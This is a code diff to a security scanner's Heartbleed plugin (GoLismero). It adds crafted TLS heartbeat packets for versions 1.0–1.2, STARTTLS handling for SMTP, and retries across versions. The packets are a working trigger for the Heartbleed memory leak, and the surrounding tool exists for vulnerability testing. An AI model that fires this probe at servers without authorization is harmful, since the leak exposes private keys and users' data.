@@ -29,7 +29,6 @@ Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 import select
 import socket
 import struct
-import sys
 import time
 
 from golismero.api.data import Relationship
@@ -65,8 +64,18 @@ c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
 00 0f 00 01 01
 ''')
 
-hb = h2bin('''
+hbv10 = h2bin('''
+18 03 01 00 03
+01 40 00
+''')
+
+hbv11 = h2bin('''
 18 03 02 00 03
+01 40 00
+''')
+
+hbv12 = h2bin('''
+18 03 03 00 03
 01 40 00
 ''')
 
@@ -112,7 +121,6 @@ def recvmsg(s):
     return typ, ver, pay
 
 def hit_hb(s):
-    s.send(hb)
     while True:
         typ, ver, pay = recvmsg(s)
         if typ is None:
@@ -132,29 +140,45 @@ def hit_hb(s):
             Logger.log('Server returned error, likely not vulnerable')
             return False
 
-def main(host, port):
+def main(host, port, starttls = False, version="1.0"):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    Logger.log('Connecting...')
-    sys.stdout.flush()
-    s.connect((host, port))
-    Logger.log('Sending Client Hello...')
-    sys.stdout.flush()
-    s.send(hello)
-    Logger.log('Waiting for Server Hello...')
-    sys.stdout.flush()
-    while True:
-        typ, ver, pay = recvmsg(s)
-        if typ == None:
-            Logger.log('Server closed connection without sending Server Hello.')
-            return
-        # Look for server hello done message.
-        if typ == 22 and ord(pay[0]) == 0x0E:
-            break
+    try:
+        Logger.log('Connecting...')
+        s.connect((host, port))
+        try:
+            if starttls:
+                Logger.log('Sending STARTTLS...')
+                re = s.recv(4096)
+                s.sendall('ehlo starttlstest\n')
+                re = s.recv(1024)
+                if not 'STARTTLS' in re:
+                    Logger.log('STARTTLS not supported.')
+                    return
+                s.sendall('starttls\n')
+                re = s.recv(1024)
+            Logger.log('Sending Client Hello...')
+            s.sendall(hello)
+            Logger.log('Waiting for Server Hello...')
+            while True:
+                typ, ver, pay = recvmsg(s)
+                if typ == None:
+                    Logger.log('Server closed connection without sending Server Hello.')
+                    return
+                # Look for server hello done message.
+                if typ == 22 and ord(pay[0]) == 0x0E:
+                    break
 
-    Logger.log('Sending heartbeat request...')
-    sys.stdout.flush()
-    s.send(hb)
-    return hit_hb(s)
+            Logger.log('Sending heartbeat request...')
+            s.sendall({
+                "1.0": hbv10,
+                "1.1": hbv11,
+                "1.2": hbv12,
+            }[version])
+            return hit_hb(s)
+        finally:
+            s.shutdown(2)
+    finally:
+        s.close()
 
 
 #------------------------------------------------------------------------------
@@ -197,16 +221,24 @@ class HeartbleedPlugin(TestingPlugin):
             ip, fp = info.instances
             target = ip
             port = fp.port
+            starttls = False
 
-            # Ignore if the port does not support SSL.
+            # Ignore if the port does not respond directly to SSL...
             if fp.protocol != "SSL":
-                Logger.log_more_verbose(
-                    "No SSL services found in fingerprint [%s] for IP %s,"
-                    " aborting." % (fp, ip))
-                return
+
+                # If it's SMTP, we need to issue a STARTTLS command first.
+                if fp.name == "smtp":
+                    starttls = True
+
+                # Ignore if the port does not support SSL.
+                else:
+                    Logger.log_more_verbose(
+                        "No SSL services found in fingerprint [%s] for IP %s,"
+                        " aborting." % (fp, ip))
+                    return
 
             # Test this port.
-            is_vulnerable = self.test(ip.address, port)
+            is_vulnerable = self.test(ip.address, port, starttls=starttls)
 
         # Internal error!
         else:
@@ -249,7 +281,7 @@ class HeartbleedPlugin(TestingPlugin):
 
 
     #--------------------------------------------------------------------------
-    def test(self, hostname, port):
+    def test(self, hostname, port, starttls = False):
         """
         Test against the specified hostname and port.
 
@@ -258,6 +290,10 @@ class HeartbleedPlugin(TestingPlugin):
 
         :param port: TCP port to test.
         :type port: int
+
+        :param starttls: True to issue a STARTTLS command, False otherwise.
+                         This is useful for SMTP only.
+        :type starttls: bool
 
         :returns: True if the host is vulnerable, False otherwise.
         :rtype: bool
@@ -274,4 +310,12 @@ class HeartbleedPlugin(TestingPlugin):
         with ConnectionSlot(hostname):
 
             # Test the host and port.
-            return main(hostname, port)
+            success = main(
+                hostname, port, starttls=starttls, version="1.1")
+            if not success:
+                success = main(
+                    hostname, port, starttls=starttls, version="1.2")
+                if not success:
+                    success = main(
+                        hostname, port, starttls=starttls, version="1.0")
+            return success
